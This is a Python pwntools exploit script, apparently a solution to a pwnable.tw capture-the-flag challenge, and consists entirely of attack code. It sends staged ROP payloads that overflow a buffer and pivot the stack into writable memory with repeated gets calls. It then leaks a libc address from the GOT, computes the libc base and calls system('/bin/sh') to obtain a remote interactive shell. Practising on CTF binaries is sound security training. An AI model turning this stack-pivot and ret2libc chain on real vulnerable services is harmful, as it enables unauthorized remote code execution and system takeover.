from pwn import *
from time import *

#io = process('./chal')
io = remote('chall.pwnable.tw',10402)
elf = ELF('./chal')
libc = ELF('./libc.so.6')

def pwn():
    rbp = 0x601800
    pop_rdi = 0x4005c3
    pop_rsi_r15 = 0x4005c1
    leave_ret = 0x400554
    pop_rbx_rbp_r12_r13_r14_r15 = 0x4005ba
    call_add_rsp_8_pop6 = 0x4005a0

    fake = b'\0'*0x70
    fake += p64(1)

    pl = 0x10*b'a'
    pl += p64(rbp)
    pl += p64(pop_rdi)
    pl += p64(rbp)
    pl += p64(elf.sym['gets'])
    pl += p64(leave_ret)
    io.sendline(pl)

    #rbp = 0x3ff500
    rbp = 0x601200
    pl = p64(rbp)
    pl += p64(pop_rdi)
    #pl += p64(0x3ff500)
    pl += p64(0x601200)
    pl += p64(elf.sym['gets'])
    pl += p64(leave_ret)
    io.sendline(pl)

    rbp = 0x6017a8
    pl = p64(rbp)
    pl += p64(pop_rdi)
    pl += p64(0x6017b0)
    pl += p64(elf.sym['gets'])
    pl += p64(pop_rdi)
    pl += p64(0x6017d0)
    pl += p64(elf.sym['gets'])
    pl += p64(leave_ret)
    pl += fake
    io.sendline(pl)

    pl = p64(pop_rbx_rbp_r12_r13_r14_r15)
    pl += p64(0xfffffffffffffdeb)
    pl += p64(0xfffffffffffffdeb+1)
    io.sendline(pl)

    pl = p64(0x20)
    pl += p64(elf.got['gets'])
    #pl += p64(0x3ff540)
    pl += p64(0x601240)
    pl += p64(call_add_rsp_8_pop6)
    pl += p64(0x41)*7
    pl += p64(pop_rdi)
    pl += p64(0x601840)
    pl += p64(elf.sym['gets'])
    io.sendline(pl)

    libc.address = u64(io.recv(6)+b'\0\0') - libc.sym['gets']
    log.info('libc: '+hex(libc.address))

    pl = p64(pop_rdi)
    pl += p64(next(libc.search(b'/bin/sh')))
    pl += p64(libc.sym['system'])
    io.sendline(pl)

pwn()
io.interactive()
